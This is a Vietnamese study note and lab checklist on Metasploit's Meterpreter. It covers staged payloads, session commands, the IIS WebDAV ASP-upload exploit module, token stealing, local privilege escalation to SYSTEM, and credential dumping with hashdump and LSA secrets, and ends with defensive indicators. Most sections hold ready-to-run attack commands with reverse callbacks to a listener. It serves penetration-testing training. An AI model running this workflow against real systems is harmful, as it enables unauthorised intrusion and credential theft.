# Meterpreter

## Khái niệm

Meterpreter là payload hậu khai thác nâng cao của Metasploit.

Nó cung cấp:

- System enumeration
    
- File management
    
- Process management
    
- Process migration
    
- OS shell
    
- Credential gathering
    
- Pivoting
    
- Post-exploitation modules
    
- Channelized communication
    

Meterpreter thường hoạt động chủ yếu trong memory, nhưng không có nghĩa là hoàn toàn không để lại dấu vết. Exploit, injection, network traffic và file upload vẫn có thể bị phát hiện.

Meterpreter không tự động persistence qua reboot.

## Staged Meterpreter

Quy trình:

```text
Target chạy stager
→ stager callback tới handler
→ handler gửi Meterpreter stage
→ Meterpreter khởi tạo
→ session mã hóa được thiết lập
→ extensions được tải
```

Ví dụ staged payload:

```text
windows/meterpreter/reverse_tcp
```

Stageless payload thường có dạng:

```text
windows/meterpreter_reverse_tcp
```

## Meterpreter Commands

Xem help:

```text
help
```

Thông tin hệ thống:

```text
sysinfo
getuid
```

Process:

```text
ps
migrate <PID>
```

Mở OS shell:

```text
shell
```

Đưa session xuống background:

```text
background
```

Hoặc:

```text
bg
```

Đóng session:

```text
exit
quit
```

## Scan với Metasploit Database

```text
db_nmap -sV -p- -A <TARGET_IP>
```

Kết quả tự động được lưu vào database:

```text
hosts
services
```

## IIS WebDAV Workflow

```text
IIS/WebDAV enumeration
→ xác định upload/write access
→ tìm module phù hợp
→ upload payload
→ đổi đuôi thành ASP
→ IIS thực thi
→ nhận Meterpreter session
```

Ví dụ module:

```text
exploit/windows/iis/iis_webdav_upload_asp
```

Cấu hình:

```text
set RHOSTS <TARGET_IP>
set LHOST tun0
run
```

## Session Enumeration

```text
getuid
sysinfo
ps
```

Nếu cần OS command:

```text
shell
```

## Token Impersonation

Liệt kê process:

```text
ps
```

Lấy token của process:

```text
steal_token <PID>
```

Kiểm tra:

```text
getuid
```

`steal_token` chỉ impersonate token của process mà session truy cập được; không tự động tạo quyền SYSTEM.

## Local Privilege Escalation

Background session:

```text
bg
```

Chạy suggester:

```text
use post/multi/recon/local_exploit_suggester
set SESSION <SESSION_ID>
run
```

Chọn local exploit phù hợp:

```text
use exploit/windows/local/<MODULE>
set SESSION <SESSION_ID>
set LHOST tun0
run
```

Kiểm tra session mới:

```text
sessions
sessions -i <NEW_SESSION_ID>
getuid
```

Mục tiêu có thể là:

```text
NT AUTHORITY\SYSTEM
```

## Credential Gathering

Khi có quyền phù hợp:

```text
hashdump
lsa_dump_sam
lsa_dump_secrets
```

Cấu trúc hashdump:

```text
Username:RID:LM_HASH:NTLM_HASH:::
```

Các thao tác credential dumping chỉ thực hiện trong phạm vi được cấp phép.

## Lưu ý phòng thủ

Dấu hiệu có thể gồm:

- File ASP được upload.
    
- WebDAV PUT/MOVE request.
    
- File tên ngẫu nhiên.
    
- Process injection.
    
- Meterpreter callback.
    
- Process migration.
    
- Credential access.
    
- SAM/LSA access.
    
- Local exploit execution.

---
# Checklist làm lab

## Giai đoạn 1: Enumeration

```
- [ ] Xác định target IP.
- [ ] Scan toàn bộ port.
- [ ] Phát hiện service/version.
- [ ] Kiểm tra HTTP methods.
- [ ] Kiểm tra WebDAV nếu có.
- [ ] Lưu kết quả vào database.
```

Ví dụ:

```
db_nmap -sV -p- -A <TARGET_IP>
hosts
services
```

---

## Giai đoạn 2: Chọn exploit

```
- [ ] Xác định chính xác service.
- [ ] Xác định version.
- [ ] Tìm module Metasploit.
- [ ] Đọc `info`.
- [ ] Kiểm tra module yêu cầu gì.
- [ ] Chọn payload phù hợp với OS/architecture.
```

Ví dụ:

```
search iis webdav
info exploit/windows/iis/iis_webdav_upload_asp
use exploit/windows/iis/iis_webdav_upload_asp
show options
```

---

## Giai đoạn 3: Cấu hình payload

```
- [ ] Set RHOSTS.
- [ ] Kiểm tra RPORT.
- [ ] Kiểm tra SSL.
- [ ] Kiểm tra VHOST nếu có.
- [ ] Set LHOST thành tun0 hoặc IP VPN.
- [ ] Kiểm tra LPORT chưa bị chiếm.
- [ ] Kiểm tra payload platform/architecture.
```

Ví dụ:

```
set RHOSTS <TARGET_IP>
set LHOST tun0
show options
run
```

---

## Giai đoạn 4: Sau khi có Meterpreter

```
- [ ] Xác nhận session.
- [ ] Chạy `sysinfo`.
- [ ] Chạy `getuid`.
- [ ] Chạy `pwd`.
- [ ] Liệt kê process với `ps`.
- [ ] Ghi lại architecture của Meterpreter và process.
- [ ] Không migrate tùy tiện.
```

Các command:

```
sysinfo
getuid
pwd
ps
```

---

## Giai đoạn 5: Kiểm tra dấu vết exploit

```
- [ ] Đọc output exploit.
- [ ] Kiểm tra file payload có bị để lại không.
- [ ] Ghi lại đường dẫn file.
- [ ] Không giả định Metasploit đã cleanup thành công.
- [ ] Chỉ cleanup khi rules of engagement cho phép.
```

Ví dụ output cần chú ý:

```
Deletion failed
403 Forbidden
```

---

## Giai đoạn 6: Xác định privilege

```
- [ ] Kiểm tra user bằng `getuid`.
- [ ] Nếu lỗi, dùng `shell` và chạy `whoami`.
- [ ] Kiểm tra process đang chạy.
- [ ] Xác định token/process có thể truy cập.
- [ ] Hiểu rằng token impersonation không đồng nghĩa privilege escalation.
```

---

## Giai đoạn 7: Local privilege escalation

```
- [ ] Background session.
- [ ] Chạy Local Exploit Suggester.
- [ ] Ghi lại các candidate.
- [ ] Đọc `info` của từng exploit.
- [ ] Xác nhận OS/architecture.
- [ ] Ưu tiên exploit có `check`.
- [ ] Set đúng SESSION.
- [ ] Dùng LPORT khác nếu cần.
- [ ] Chạy exploit.
- [ ] Kiểm tra session mới.
```

Ví dụ:

```
bg
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

---

## Giai đoạn 8: Xác minh SYSTEM

```
- [ ] Liệt kê session.
- [ ] Tương tác session mới.
- [ ] Chạy `getuid`.
- [ ] Chạy `sysinfo`.
- [ ] Xác nhận `NT AUTHORITY\SYSTEM`.
```

---

## Giai đoạn 9: Credential gathering

```
- [ ] Xác nhận hoạt động nằm trong scope.
- [ ] Xác nhận đang có SYSTEM.
- [ ] Chạy hashdump nếu bài lab yêu cầu.
- [ ] Lưu output an toàn.
- [ ] Không upload hash lên dịch vụ public.
- [ ] Ghi lại nguồn của từng credential.
```

Commands:

```
hashdump
lsa_dump_sam
lsa_dump_secrets
```